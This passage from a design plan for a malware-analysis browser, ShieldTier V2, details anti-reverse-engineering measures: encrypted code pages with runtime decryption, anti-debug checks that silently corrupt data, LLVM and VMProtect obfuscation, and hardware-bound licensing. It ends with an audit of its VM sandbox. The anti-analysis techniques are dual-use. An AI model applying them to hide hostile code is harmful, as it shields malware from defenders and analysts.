    uint8_t ciphertext[4096];
    uint8_t auth_tag[16];  // GCM authentication tag
};

void page_fault_handler(int sig, siginfo_t* info, void* ctx) {
    void* fault_addr = info->si_addr;
    int page_idx = (fault_addr - code_base) / PAGE_SIZE;

    if (is_encrypted_page(page_idx)) {
        mprotect(page_addr, PAGE_SIZE, PROT_READ | PROT_WRITE);

        aes_256_gcm_decrypt(
            encrypted_pages[page_idx].ciphertext,
            page_addr, PAGE_SIZE,
            runtime_derived_key,  // Derived from hardware fingerprint + license
            encrypted_pages[page_idx].iv
        );

        if (!verify_auth_tag(page_addr, encrypted_pages[page_idx].auth_tag)) {
            // Tampered — silent corruption
            corrupt_global_state();
        }

        mprotect(page_addr, PAGE_SIZE, PROT_READ | PROT_EXEC);
        schedule_reencryption(page_idx, 5000);  // Re-encrypt after 5s idle
    }
}
```

**Result**: A memory dump at any point captures ~90% ciphertext. The decryption key is derived from hardware + license, so the dump is useless on another machine.

### 3F: Renderer Protection (React UI)

The React UI contains no detection logic, but we still protect it:

1. **javascript-obfuscator** with maximum settings:
   - Control flow flattening + dead code injection
   - String encryption (rc4 encoding)
   - Self-defending code (breaks if beautified)
   - Debug protection (anti-DevTools)
   - Identifier mangling

2. **AssemblyScript → WASM** for any renderer-side computation:
   - If any analysis display logic must compute in the renderer, write it in AssemblyScript
   - Compile to WebAssembly + apply WASMixer binary obfuscation
   - WASM decompilation loses ALL variable names, function names, type info
   - Academic research: only ~20% of decompiled complex WASM maintains correctness

3. **ASAR Integrity** (if using Electron for UI):
   - Enable `EnableEmbeddedAsarIntegrityValidation` and `onlyLoadAppFromAsar` fuses
   - Detect ASAR tampering at startup

---

## Layer 4: Encrypted Rule Delivery

### Purpose

Proprietary YARA rules, detection signatures, ML model weights, and scoring thresholds are delivered encrypted from ShieldTier Cloud. They exist in plaintext only in RAM, never on disk.

### Architecture

```
ShieldTier Cloud (Hetzner)                       ShieldTier Client
        │                                              │
        │  1. Client authenticates:                    │
        │     POST /auth/validate                      │
        │     {license_id, machine_fingerprint,        │
        │      app_version, code_attestation_hash}     │
        │                                         ◄────┤
        │                                              │
        │  2. Server validates:                        │
        │     - License not expired/revoked            │
        │     - Fingerprint matches bound machine      │
        │     - Code attestation hashes match          │
        │       known-good values for this version     │
        │                                              │
        │  3. Server packages rules:                   │
        │     - Proprietary YARA rules                 │
        │     - Behavioral signatures                  │
        │     - ML model weights                       │
        │     - Scoring thresholds                     │
        │     - Threat intel indicators                │
        │                                              │
        │  4. Encrypt package:                         │
        │     - AES-256-GCM with license-bound key     │
        │     - Expiry timestamp baked into signed      │
        │       package (7-day TTL)                    │
        │     - Ed25519 signature over entire payload  │
        │                                              │
        │  5. Send encrypted package ─────────────────►│
        │                                              │
        │     6. Client verifies Ed25519 signature     │
        │     7. Client caches encrypted blob to disk  │
        │        (safe — requires license key)         │
        │     8. Client decrypts in memory:            │
        │        - Rule decryption key from Secure     │
        │          Enclave / DPAPI / Secret Service    │
        │        - Decrypted rules compiled in RAM     │
        │        - Plaintext buffer zeroed immediately │
        │     9. After 7 days: package expires,        │
        │        must re-fetch from cloud              │
        │                                              │
```

### Encrypted Rule Package Format

```cpp
struct EncryptedRulePackage {
    uint32_t version;
    int64_t timestamp;
    int64_t expires_at;          // 7-day TTL — signed by server, cannot be extended
    uint32_t payload_size;
    uint8_t iv[12];              // AES-256-GCM IV
    uint8_t auth_tag[16];       // AES-256-GCM authentication tag
    uint8_t server_signature[64]; // Ed25519 signature over all above fields + payload
    char key_id[32];             // Which server key signed this
    uint8_t encrypted_payload[]; // Variable-length AES-256-GCM ciphertext
};
```

### Key Derivation

The rule decryption key is NOT stored directly. It is derived:

```
rule_key = HKDF-SHA256(
    ikm = license_private_key,       // From Secure Enclave / DPAPI
    salt = machine_fingerprint_hash,  // Hardware-bound
    info = "shieldtier-rule-key-v2"
)
```

This means: even if someone copies the encrypted rule cache file to another machine, they cannot decrypt it without both the license key AND the matching hardware.

### Offline Behavior

| Connectivity | Behavior |
|-------------|----------|
| Online | Rules refreshed every 24h with heartbeat |
| Offline < 7 days | Cached encrypted rules work normally |
| Offline 7-30 days | Encrypted rules expired, basic open-source rules only |
| Offline > 30 days | License grace period expired, all premium features degrade to free tier |

### What an Attacker Gets by Dumping Memory

If someone attaches a debugger and dumps memory while rules are decrypted:
- They get a **point-in-time snapshot** of the rules
- Rules update weekly — the snapshot is stale within days
- The ongoing value is the **feed**, not any single version
- They still need to defeat Layer 3 (anti-debug mesh) first
- Anti-debug detection silently corrupts keys, so the "decrypted" rules may already be garbage

---

## Layer 5: Server-Side Crown Jewels

### Purpose

The ultimate protection: **code that never ships to the client cannot be stolen.** The most valuable detection logic runs exclusively on ShieldTier Cloud.

### What Stays on the Server

| Asset | Why Server-Side |
|-------|----------------|
| Proprietary YARA rules (advanced) | Competitive advantage — updated weekly by our threat research |
| ML threat scoring models | Trained models are expensive IP — architecture + weights |
| Threat intelligence correlation engine | Cross-references IOCs across all ShieldTier users |
| Behavioral signature database | Accumulated from sandbox results across entire user base |
| Advanced heuristic decision trees | Scoring weights, thresholds, classification boundaries |
| Fleet-wide detection (consensus reputation) | "Is this hash seen by other ShieldTier users?" |
| Rule compilation service | Client sends features → server returns pre-compiled match results |

### What Stays on the Client (Always Available, Even Offline)

| Capability | Why Client-Side |
|-----------|----------------|
| Static analysis (PE/PDF/Office parsing) | Fast, no network needed, not proprietary |
| Hash computation (MD5/SHA-1/SHA-256/ssdeep/imphash) | Deterministic, not secret |
| Local bloom filter (~50MB, 100M+ known bad hashes) | Pre-loaded, fast lookup |
| Basic YARA rules (open-source community rules) | Publicly available anyway |
| Basic heuristic scoring (entropy, import analysis, string analysis) | Published techniques |
| Network capture, DOM snapshots, screenshots | Forensic capture, not detection logic |
| File quarantine + format parsing | Isolation, not analysis |
| Email MIME parsing + header analysis | RFC-based, not proprietary |
| VPN integration, config, export | Infrastructure, not IP |

### Server-Enhanced Analysis Flow

```
Client                                 ShieldTier Cloud
  │                                          │
  │  1. Extract features locally:            │
  │     - Hashes (MD5, SHA256, ssdeep,       │
  │       imphash)                           │
  │     - PE sections (name, entropy, size,  │
  │       virtual size)                      │
  │     - Import table (DLLs, functions)     │
  │     - Strings (total count, suspicious   │
  │       patterns, URLs, IPs)               │
  │     - Headers (timestamp, machine,       │
  │       characteristics)                   │
  │     - Behavioral indicators from sandbox │
  │                                          │
  │  2. Send feature vector ───────────────► │
  │     (NOT the raw file — only derived     │
  │      features, protecting user privacy)  │
  │                                          │
  │     3. Server runs:                      │
  │        - Proprietary YARA matching       │
  │        - ML model scoring                │
  │        - Threat intel correlation        │
  │        - Fleet-wide reputation lookup    │
  │        - Behavioral signature matching   │
  │                                          │
  │  4. Receive verdict + findings ◄──────── │
  │     {verdict, confidence, findings[],    │
  │      mitre_techniques[], risk_level}     │
  │                                          │
  │  5. Display in UI alongside local        │
  │     analysis results                     │
  │                                          │
```

**Key property**: Client can extract features but cannot score them (no rules, no models, no threat intel). Server can score features but never sees the raw file (user privacy). Neither side has the complete picture — this is an architectural split that protects both IP and user data.

### Tier Model

| Tier | Local Analysis | Cloud Analysis | Price |
|------|---------------|----------------|-------|
| **Free** | Basic static analysis, open-source YARA, hash lookup (bloom filter) | None | $0 |
| **Pro** | + Encrypted premium YARA rules, + inline sandbox, + email analysis | + ML scoring, + threat intel correlation | $X/mo |
| **Team** | + Everything in Pro | + Fleet-wide reputation, + API access, + shared threat intel | $Y/mo |
| **Enterprise** | + Everything in Team | + Custom YARA rules hosted server-side, + SLA, + dedicated scoring | $Z/mo |

Premium features require a valid license token. Token checked before each cloud API call. Server rejects expired tokens.

---

## V2 Source Tree (After Migration)

```
shieldtier-v2-browser/
├── CMakeLists.txt                    # Top-level CMake (CEF + native analysis + obfuscation)
├── cmake/
│   ├── FindCEF.cmake                 # CEF SDK discovery
│   ├── ObfuscationPasses.cmake       # O-LLVM / Hikari pass flags
│   └── VMProtect.cmake               # VMProtect post-link step
│
├── src/
│   ├── native/                       # ALL C++ (compiles to single native binary)
│   │   ├── app/
│   │   │   ├── main.cpp              # App entry point, CEF initialization
│   │   │   ├── app_handler.cpp       # CefClient implementation
│   │   │   └── browser_handler.cpp   # CefBrowserProcessHandler
│   │   │
│   │   ├── browser/
│   │   │   ├── session_manager.cpp   # Per-tab CefBrowser + CefRequestContext
│   │   │   ├── response_filter.cpp   # CefResponseFilter (streaming interception)
│   │   │   ├── download_handler.cpp  # CefDownloadHandler
│   │   │   ├── request_handler.cpp   # CefRequestHandler (network policy)
│   │   │   ├── cookie_manager.cpp    # Per-session CefCookieManager
│   │   │   └── navigation.cpp        # Back/forward/reload/URL bar
│   │   │
│   │   ├── analysis/                 # ALL analysis engines (ported from V1 TypeScript)
│   │   │   ├── yara/                 # libyara integration
│   │   │   │   ├── scanner.cpp
│   │   │   │   ├── rule_manager.cpp  # Encrypted rule loading + compilation
│   │   │   │   └── builtin_rules.cpp # Open-source rules (compiled in)
│   │   │   ├── fileanalysis/
│   │   │   │   ├── manager.cpp
│   │   │   │   ├── pe_analyzer.cpp   # pe-parse library
│   │   │   │   ├── pdf_analyzer.cpp
│   │   │   │   ├── office_analyzer.cpp
│   │   │   │   ├── archive_analyzer.cpp # libarchive
│   │   │   │   └── general_analyzer.cpp
│   │   │   ├── sandbox/
│   │   │   │   ├── engine.cpp        # Inline behavioral sandbox
│   │   │   │   ├── signatures.cpp    # VMProtect-virtualized
│   │   │   │   ├── network_profiler.cpp
│   │   │   │   ├── script_analyzer.cpp
│   │   │   │   └── collector.cpp
│   │   │   ├── advanced/
│   │   │   │   ├── pe_capability/    # PE API sequence detection
│   │   │   │   ├── script_detonation/ # VM-based script execution
│   │   │   │   ├── shellcode_emulator/ # x86 emulation
│   │   │   │   ├── heap_forensics/   # Heap analysis
│   │   │   │   ├── dns_network/      # DNS/network forensics
│   │   │   │   ├── wasm_inspector/   # WASM analysis (wabt)
│   │   │   │   ├── inetsim/          # Fake network services
│   │   │   │   └── artifactql/       # Artifact query engine
│   │   │   ├── enrichment/
│   │   │   │   ├── manager.cpp
│   │   │   │   ├── extractors.cpp    # IOC extraction
│   │   │   │   └── providers/        # VT, AbuseIPDB, OTX, URLhaus, WHOIS, MISP
│   │   │   ├── email/
│   │   │   │   ├── manager.cpp
│   │   │   │   ├── parser.cpp        # MIME parsing
│   │   │   │   ├── header_analyzer.cpp
│   │   │   │   └── content_analyzer.cpp
│   │   │   ├── content/              # Page content analysis
│   │   │   ├── loganalysis/          # Log parsers + analysis engines
│   │   │   │   ├── manager.cpp
│   │   │   │   ├── detector.cpp
│   │   │   │   ├── normalizer.cpp
│   │   │   │   ├── converters/       # CSV, JSON, EVTX, PCAP, EML, XLSX, etc.
│   │   │   │   └── engines/          # verdict, insights, investigation, triage, graph, hunting
│   │   │   └── threatfeed/           # STIX/TAXII ingestion
│   │   │
│   │   ├── scoring/                  # VMProtect-virtualized scoring engine
│   │   │   ├── engine.cpp            # Main scoring algorithm
│   │   │   ├── heuristics.cpp        # Detection heuristics
│   │   │   └── threat_model.cpp      # Threat classification
│   │   │
│   │   ├── capture/                  # CDP capture via CEF native API
│   │   │   ├── manager.cpp
│   │   │   ├── har_builder.cpp
│   │   │   └── session.cpp
│   │   │
│   │   ├── security/                 # Protection subsystems
│   │   │   ├── license.cpp           # Hardware-bound licensing
│   │   │   ├── fingerprint.cpp       # Machine fingerprint (5-factor)
│   │   │   ├── attestation.cpp       # Code self-hashing + attestation
│   │   │   ├── integrity_mesh.cpp    # Guard mesh (A checks B checks C)
│   │   │   ├── anti_debug.cpp        # Anti-debugging (12 methods)
│   │   │   ├── encrypted_pages.cpp   # Lazy code page decryption
│   │   │   ├── rule_crypto.cpp       # Encrypted rule package handling
│   │   │   └── keychain.cpp          # Secure Enclave / DPAPI / Secret Service
│   │   │
│   │   ├── vm/                       # QEMU VM sandbox (ported from V1)
│   │   │   ├── manager.cpp
│   │   │   ├── orchestrator.cpp
│   │   │   ├── qemu_args.cpp
│   │   │   ├── qemu_installer.cpp
│   │   │   ├── image_builder.cpp
│   │   │   ├── agent_builder.cpp
│   │   │   ├── agent_provisioner.cpp
│   │   │   ├── serial_console.cpp
│   │   │   ├── inetsim_server.cpp
│   │   │   ├── scoring.cpp
│   │   │   ├── protocol.cpp
│   │   │   └── types.h
│   │   │
│   │   ├── chat/                     # E2E encrypted chat (libsodium)
│   │   │   ├── manager.cpp
│   │   │   ├── shieldcrypt.cpp
│   │   │   ├── network.cpp
│   │   │   └── message_store.cpp
│   │   │
│   │   ├── auth/                     # Cloud auth (JWT, bcrypt)
│   │   │   ├── manager.cpp
│   │   │   └── types.h
│   │   │
│   │   ├── config/                   # Atomic JSON config store
│   │   │   └── store.cpp
│   │   │
│   │   ├── export/                   # HTML/JSON/ZIP report generation
│   │   │   ├── manager.cpp
│   │   │   ├── html_template.cpp
│   │   │   ├── json_export.cpp
│   │   │   ├── zip_builder.cpp
│   │   │   └── defang.cpp
│   │   │
│   │   ├── network/                  # Network policy enforcement
│   │   │   └── policy.cpp
│   │   │
│   │   └── ipc/                      # IPC bridge (native ↔ renderer)
│   │       ├── handler.cpp           # CEF message router handler
│   │       └── protocol.h            # JSON message schema
│   │
│   └── renderer/                     # React UI (unchanged from V1, loaded by CEF)
│       ├── main.tsx
│       ├── App.tsx
│       ├── types.ts
│       ├── styles/
│       └── components/               # All existing V1 components
│
├── third_party/
│   ├── cef/                          # CEF SDK (downloaded at build time)
│   ├── libyara/                      # YARA C library
│   ├── libsodium/                    # Crypto (NaCl/libsodium)
│   ├── libcurl/                      # HTTP client
│   ├── pe-parse/                     # PE file parser
│   ├── libarchive/                   # Archive handling
│   └── wabt/                         # WASM binary toolkit
│
├── scripts/
│   ├── download-cef.sh               # Fetch CEF SDK for platform
│   ├── vmprotect-post-link.sh        # Apply VMProtect after linking
│   └── sign-and-package.sh           # Code signing + packaging
│
├── agents/
│   └── vm-agent/                     # Go agent for QEMU VMs (unchanged from V1)
│
└── PLAN.md                           # This document
```

---

## V2 Build Pipeline

```
Source Code (C++ + React)
     │
     ├── src/native/ ──────────────────────────────────────────────────────┐
     │       │                                                             │
     │       ├── clang++ with O-LLVM passes                                │
     │       │   -mllvm -fla (control flow flattening)                     │
     │       │   -mllvm -sub (instruction substitution)                    │
     │       │   -mllvm -bcf (bogus control flow)                          │
     │       │   -mllvm -sobf (string obfuscation)                         │
     │       │   -mllvm -mba (mixed boolean arithmetic)                    │
     │       │                                                             │
     │       ├── Link with: CEF SDK, libyara, libcurl, libsodium,          │
     │       │   pe-parse, libarchive, wabt, BoringSSL                     │
     │       │                                                             │
     │       ├── VMProtect post-link processing:                           │
     │       │   - Virtualize marked functions (license, scoring,          │
     │       │     matching, key derivation, integrity checks)             │
     │       │   - Ultra mode for most critical functions                  │
     │       │   - Multiple VM architectures per binary                    │
     │       │                                                             │
     │       ├── Encrypt code pages:                                       │
     │       │   - AES-256-GCM per 4KB page                                │
     │       │   - Key derived from build + hardware binding               │
     │       │                                                             │
     │       ├── Embed integrity hashes:                                   │
     │       │   - SHA-256 of every code section                           │
     │       │   - Expected values in read-only data segment               │
     │       │                                                             │
     │       ├── Strip debug symbols:                                      │
     │       │   - Separate .dSYM (macOS) / .pdb (Win) for crash reporting │
     │       │   - Ship binary with no symbols                             │
     │       │                                                             │
     │       └── Output: ShieldTier native binary                          │
     │                                                                     │
     ├── src/renderer/ ────────────────────────────────────────────────────┐
     │       │                                                             │
     │       ├── Vite build → minified + tree-shaken JS bundle             │
     │       │                                                             │
     │       ├── javascript-obfuscator post-processing:                    │
     │       │   - Control flow flattening                                 │
     │       │   - String encryption (rc4)                                 │
     │       │   - Dead code injection                                     │
     │       │   - Self-defending code                                     │
     │       │   - Debug protection (anti-DevTools)                        │
     │       │   - Identifier mangling                                     │
     │       │                                                             │
     │       └── Output: dist/renderer/ (loaded by CEF)                    │
     │                                                                     │
     └── Packaging ────────────────────────────────────────────────────────┘
             │
             ├── Code signing:
             │   - macOS: Apple notarization (Developer ID + notarytool)
             │   - Windows: Authenticode (EV code signing certificate)
             │   - Linux: GPG signature
             │
             ├── Package format:
             │   - macOS: .app bundle → DMG (arm64 + x64 universal)
             │   - Windows: NSIS installer (x64)
             │   - Linux: AppImage (x64 + arm64)
             │
             └── Output: release/ directory
```

---

## Attacker Cost Analysis

What a reverse engineer faces at each stage:

| Stage | V1 (Current — Bytenode) | V2 (This Architecture) | Effort Delta |
|-------|------------------------|----------------------|-------------|
| **Open app bundle** | `.jsc` files visible | Native `.dylib`/`.exe`/`.so` | Minutes → requires IDA/Ghidra |
| **Read analysis logic** | View8 decompiles in seconds | VMProtect-virtualized functions | Seconds → **weeks per function** |
| **Extract YARA rules** | Embedded in `.jsc`, trivially readable | Encrypted, cloud-delivered, in-memory only | Copy file → must defeat 3 layers |
| **Understand scoring** | Read the TypeScript | LLVM-obfuscated (CFF+MBA) + VMProtect on core | Read source → months of RE |
| **Attach debugger** | Works, trace everything | Anti-debug mesh (12 methods), silent corruption | Trivial → cat-and-mouse, may get garbage data |
| **Dump memory** | Gets all JS in plaintext | ~90% encrypted code pages, keys hardware-bound | Copy → useless on another machine |
| **Patch license check** | NOP the check | Integrity guard mesh auto-repairs, silent corruption | 1 byte → must defeat interconnected guards |
| **Copy to another machine** | Copy folder, works | Hardware-bound license, Secure Enclave key | Copy → license validation fails |
| **Run offline forever** | Works indefinitely | 30-day grace, then premium degrades | Free → time-limited |
| **Steal scoring algorithm** | Read `.jsc` file | Runs server-side, never ships to client | Read file → **impossible** |

---

## Implementation Phases

### Phase A: CEF Shell + Native Core (Weeks 1-6)

Port the CEF browser shell (already planned above in this document) AND begin porting analysis engines to C++. This is the foundation everything else builds on.

1. CEF shell with basic browser, tabs, navigation
2. CefResponseFilter + CefDownloadHandler (replaces CDP Fetch hacks)
3. CefRequestHandler (network policy)
4. Port YARA engine to C++ (libyara integration)
5. Port file analysis (PE/PDF/Office) to C++ (pe-parse + custom)
6. Port enrichment manager to C++ (libcurl)
7. Port sandbox engine to C++
8. IPC bridge: CEF native ↔ React renderer via CefMessageRouter
9. Build system: CMake + CEF SDK + all native dependencies

### Phase B: Analysis Engine Migration (Weeks 7-12)

Port remaining analysis subsystems:

1. Advanced analysis (PE capability, script detonation, shellcode emulator, heap forensics, DNS/network, WASM inspector)
2. Email analysis
3. Content analysis
4. Log analysis (13 converters + 6 engines)
5. Threat feed (STIX/TAXII)
6. Capture manager (HAR builder via CEF's native CDP access)
7. VM sandbox orchestration (QEMU management)
8. Chat (ShieldCrypt via libsodium)
9. Auth (JWT validation, bcrypt)
10. Config store, export, network policy

### Phase C: LLVM Obfuscation (Week 13)

1. Set up O-LLVM / Hikari / Pluto in CMake build pipeline
2. Enable CFF + MBA + BCF + string encryption + instruction substitution
3. Verify all analysis engines produce correct results after obfuscation
4. Performance benchmark: ensure <2x overhead on typical analysis workloads

### Phase D: VMProtect Integration (Week 14)

1. Mark critical functions for virtualization (scoring, YARA matching, license validation, key derivation, integrity checks)
2. Apply VMProtect post-link processing
3. Configure Ultra mode for license + scoring functions
4. Verify correctness after virtualization
5. Benchmark: ensure VMProtect overhead is acceptable (these functions are not hot-path)

### Phase E: Encrypted Rule Delivery (Weeks 15-16)

1. Server-side: Build rule packaging + encryption service on ShieldTier Cloud (Hetzner)
2. Server-side: Ed25519 signing of rule packages
3. Client-side: Rule decryption key derivation (HKDF from license + hardware)
4. Client-side: Encrypted rule cache management (download, verify, decrypt, compile, zero)
5. Client-side: Expiry enforcement (7-day TTL, 30-day offline grace)
6. Test: online delivery, offline cache, expiry, re-fetch

### Phase F: Server-Side Analysis (Weeks 17-18)

1. Deploy proprietary YARA rules + ML scoring on ShieldTier Cloud
2. Build `/analyze` API endpoint (accepts feature vectors, returns verdicts)
3. Client-side: feature extraction → API call → merge with local results
4. Implement tier gating (free / pro / team / enterprise)
5. Test: latency, offline fallback, tier enforcement

### Phase G: Licensing + Hardware Binding (Weeks 19-20)

1. Machine fingerprint generation (5-factor, cross-platform)
2. License server: activation, binding, heartbeat, revocation endpoints
3. Secure Enclave integration (macOS), DPAPI (Windows), Secret Service (Linux)
4. License blob signing + verification
5. Fuzzy fingerprint matching (3-of-5)
6. Offline grace period enforcement (30 days)

### Phase H: Anti-Debug + Integrity + Encrypted Pages (Weeks 21-22)

1. Anti-debug mesh: implement all 12 detection methods
2. Integrity guard mesh: Guards A/B/C cross-checking each other
3. Silent corruption response system
4. Encrypted code pages with lazy decryption
5. Page re-encryption timer
6. End-to-end testing: verify protection activates correctly, verify silent corruption works

### Phase I: Renderer Protection + Final Integration (Week 23)

1. javascript-obfuscator integration in Vite build
2. AssemblyScript → WASM for any renderer-side computation
3. Code signing (Apple notarization, Authenticode, GPG)
4. Cross-platform packaging (DMG, NSIS, AppImage)
5. Full end-to-end testing with real malware samples
6. Performance validation across all platforms

---

## References

### Browser Engine
- [CEF Project](https://bitbucket.org/chromiumembedded/cef)
- [CEF C++ API Docs](https://magpcss.org/ceforum/apidocs3/)
- [CEF Binary Distributions](https://cef-builds.spotifycdn.com/index.html)
- [Chrome DevTools Protocol — Fetch Domain](https://chromedevtools.github.io/devtools-protocol/tot/Fetch/)
- [Electron Debugger API](https://www.electronjs.org/docs/latest/api/debugger)

### Electron Issues (V1 Pain Points)
- [Electron Issue #23594](https://github.com/electron/electron/issues/23594) — Fetch.getResponseBody
- [Electron Issue #27768](https://github.com/electron/electron/issues/27768) — CDP Fetch crashes
- [Electron Issue #37491](https://github.com/electron/electron/issues/37491) — Response body retrieval
- [Electron Issue #36261](https://github.com/electron/electron/issues/36261) — WebRequest body access
- [Electron Issue #46048](https://github.com/electron/electron/issues/46048) — CDP event dispatching
- [Playwright Issue #6573](https://github.com/microsoft/playwright/issues/6573) — Downloads canceled

### Alternative Engines (Evaluated and Rejected)
- [Playwright crNetworkManager.ts](https://github.com/microsoft/playwright/blob/main/packages/playwright-core/src/server/chromium/crNetworkManager.ts)
- [mockttp](https://github.com/httptoolkit/mockttp) — Node.js MITM proxy
- [Ladybird Browser](https://ladybird.org/)
- [Servo Engine](https://servo.org/)

### Source Code Protection — Binary
- [VMProtect](https://vmpsoft.com/) — Code virtualization
- [Themida / Code Virtualizer](https://www.oreans.com/) — RISC-style VM obfuscation (FISH/TIGER/DOLPHIN/SHARK/EAGLE architectures)
- [Obfuscator-LLVM (O-LLVM)](https://github.com/obfuscator-llvm/obfuscator) — LLVM-based CFF, MBA, BCF
- [Hikari](https://github.com/HikariObfuscator/Hikari) — O-LLVM fork with string encryption, indirect calls, anti-class-dump
- [Pluto](https://github.com/nicxaxminux/pluto-obfuscator) — O-LLVM fork with trap-based opaque predicates
- [Denuvo](https://irdeto.com/denuvo/) — Anti-tamper (VMProtect + online token + trigger system)
- [Arxan / Digital.ai](https://digital.ai/application-protection) — Code guard mesh, repair guards

### Source Code Protection — JavaScript/Node.js
- [View8](https://github.com/suleram/View8) — V8 bytecode decompiler (broke Bytenode)
- [Ghidra NodeJS Plugin](https://github.com/PositiveTechnologies/ghidra_nodejs) — .jsc decompilation in Ghidra
- [Bytenode Issue #241](https://github.com/bytenode/bytenode/issues/241) — "Protection against View8"
- [Check Point — V8 JavaScript in Malware](https://research.checkpoint.com/2024/exploring-compiled-v8-javascript-usage-in-malware/)
- [PT SWARM — Bypassing Bytenode](https://swarm.ptsecurity.com/how-we-bypassed-bytenode-and-decompiled-node-js-bytecode-in-ghidra/)
- [javascript-obfuscator](https://github.com/javascript-obfuscator/javascript-obfuscator)
- [JScrambler](https://jscrambler.com/) — Polymorphic JS obfuscation
- [electron-link](https://github.com/atom/electron-link) — V8 snapshot bundling
- [electron-mksnapshot](https://github.com/electron/mksnapshot) — Custom V8 snapshots
- [Inkdrop V8 Snapshots](https://github.com/inkdropapp/electron-v8snapshots-example)

### Source Code Protection — WebAssembly
- [AssemblyScript](https://www.assemblyscript.org/) — TypeScript-like → WASM compiler
- [WASMixer](https://arxiv.org/abs/2308.03123) — WASM binary obfuscator (ESORICS 2024)
- [JEB WASM Decompiler](https://www.pnfsoftware.com/jeb/manual/webassembly/)

### Cryptography & Key Protection
- [White-Box AES — Chow et al.](https://link.springer.com/chapter/10.1007/3-540-36492-7_17)
- [DCA Attack on White-Box](https://eprint.iacr.org/2015/753) — Bos et al. 2016
- [Apple Secure Enclave](https://support.apple.com/guide/security/secure-enclave-sec59b0b31ff/web)
- [TPM 2.0 Specification](https://trustedcomputinggroup.org/resource/tpm-library-specification/)
- [AWS Nitro Enclaves](https://aws.amazon.com/ec2/nitro/nitro-enclaves/)

### Industry Reference (How Others Protect)
- [1Password 8 — Rust Core](https://blog.1password.com/1password-8-the-story-so-far/)
- [1Password electron-hardener](https://github.com/1Password/electron-hardener)
- [Figma — WASM Performance](https://www.figma.com/blog/webassembly-cut-figmas-load-time-by-3x/)
- [CrowdStrike Falcon Architecture](https://www.crowdstrike.com/cybersecurity-101/falcon-platform/) — Lightweight agent + cloud brain
- [SentinelOne Architecture](https://www.sentinelone.com/) — Heavy local agent + cloud visibility

---

## VM Sandbox Upgrade — V1 Audit & V2 Architecture

### V1 VM Sandbox: Honest Assessment

A complete audit of the V1 Go agent and QEMU orchestration reveals the VM sandbox is **~30% implemented**. The TypeScript types define a comprehensive event model, but the Go agent only produces a fraction of those events.

#### What Actually Works in V1

| Component | Status | Details |
|-----------|--------|---------|
| QEMU orchestration | Working | Boot, snapshot, restore, sample injection |
| Process monitoring (Linux) | Working | `/proc` polling at 500ms intervals |
| Process monitoring (Windows) | **STUB** | `etw.go` contains only WMIC polling, zero ETW code |
| Network capture | Partial | Counts connections, no packet content |
| DNS simulation | Partial | Resolves to INetSim IP, but forwarding path is broken |
| HTTP simulation | Working | INetSim fake HTTP serves canned responses |
| File events | **Not implemented** | `FileEvent` type defined, no agent code produces them |
| Registry events | **Not implemented** | `RegistryEvent` type defined, no agent code produces them |
| Memory events | **Not implemented** | `MemoryEvent` type defined, no agent code produces them |
| Injection events | **Not implemented** | `InjectionEvent` type defined, no agent code produces them |
| Scoring engine | Partially broken | Weights events that never fire — verdict is partially fictional |
| Agent delivery | Working | 9p virtfs (Linux) / VVFAT (Windows), serial console bootstrap |
| Virtio-serial protocol | Working | NDJSON bidirectional communication |

#### V1 Code Audit — Critical Findings

**1. Windows ETW is Fake**
```go
// agents/vm-agent/internal/monitor/windows/etw.go
// ACTUAL CODE — this is not ETW, it's WMIC polling:
func (m *Monitor) pollProcesses() {
    cmd := exec.Command("wmic", "process", "list", "brief")
    // ... parses WMIC output ...
}
```
Real ETW requires `advapi32.dll` → `StartTrace` → `EnableTraceEx2` → `ProcessTrace` with kernel providers (`Microsoft-Windows-Kernel-Process`, `Microsoft-Windows-Kernel-File`, etc.). V1 has none of this.

**2. Linux Agent is Polling-Based**
```go
// agents/vm-agent/internal/monitor/linux/procmon.go
// Polls /proc every 500ms — misses short-lived processes entirely
func (m *Monitor) scan() {
    entries, _ := os.ReadDir("/proc")
    for _, e := range entries {
        pid, err := strconv.Atoi(e.Name())
        // ... reads /proc/[pid]/cmdline, stat ...
    }
}
```
Real process monitoring uses `proc_connector` (CN_PROC) via netlink socket for zero-latency fork/exec/exit events. V1 misses any process that lives < 500ms.

**3. Event Types Without Producers**
The TypeScript `types.ts` defines: `ProcessEvent`, `FileEvent`, `RegistryEvent`, `NetworkEvent`, `MemoryEvent`, `InjectionEvent`. But the Go agent only sends `ProcessEvent` and basic `NetworkEvent` (connection count). The other 4 event types are **dead interfaces**.

**4. Scoring Weights Phantom Events**
```typescript
// src/main/vm/scoring.ts — weights events the agent never sends:
const WEIGHTS = {
  process_create: 1,
  file_create: 2,      // ← never fires
  file_modify: 2,      // ← never fires
  registry_modify: 3,  // ← never fires
  network_connect: 1,
  injection: 5,        // ← never fires
  memory_alloc: 2,     // ← never fires
};
```

**5. DNS Forwarding is Broken**
The INetSim DNS server resolves all queries to the INetSim IP, but the `forwardDNS` code path has a bug where it tries to forward to `8.8.8.8` in sandbox mode (where `restrict=on` blocks all real network access).

---

### V2 VM Sandbox: What C++ Native Code Enables

Moving to CEF/C++ unlocks VM capabilities that are **impossible** in Node.js/Electron:

#### Tier 1 — Fix What's Broken (V1 Parity, Done Right)

| V1 Problem | V2 Solution |
|-----------|-------------|
| WMIC polling (fake ETW) | Real ETW via Windows kernel providers or agentless VMI |
| /proc polling (misses short-lived) | proc_connector (CN_PROC) netlink or agentless syscall hooking |
| No file events | Agentless VMI hooks NtCreateFile/NtWriteFile at kernel level |
| No registry events | VMI hooks NtSetValueKey/NtDeleteValueKey |
| No memory events | EPT violation trapping on VirtualAlloc/NtAllocateVirtualMemory |
| No injection events | VMI hooks NtWriteVirtualMemory/NtQueueApcThread/NtCreateThreadEx |
| Broken DNS forwarding | Proper INetSim DNS — never forward in sandbox mode |
| Scoring phantom events | Score only events that actually fire |

#### Tier 2 — Agentless VMI (Virtual Machine Introspection)

The biggest upgrade: **remove the in-guest agent entirely** for monitoring.

**Why Agentless?**
- Malware detects agents (process list, file system scan, timing analysis)
- Agents can be killed or corrupted by malware
- Agents require different builds per guest OS
- Agents add attack surface (malware could exploit the agent)

**How VMI Works (DRAKVUF-style)**

```
┌────────────────────────────────────────────────────┐
│  Host (ShieldTier V2 process)                      │
│                                                     │
│  ┌──────────────────────────────────────────────┐  │
│  │  VMI Engine (C++ library)                    │  │
│  │                                               │  │
│  │  1. Maps guest physical memory (EPT/NPT)     │  │
│  │  2. Locates kernel structures (KPCR, EPROCESS)│  │
│  │  3. Sets EPT hooks on syscall entry points   │  │
│  │  4. Traps on access → reads arguments        │  │
│  │  5. Returns execution to guest transparently  │  │
│  └──────────────────┬───────────────────────────┘  │
│                     │ reads memory                   │
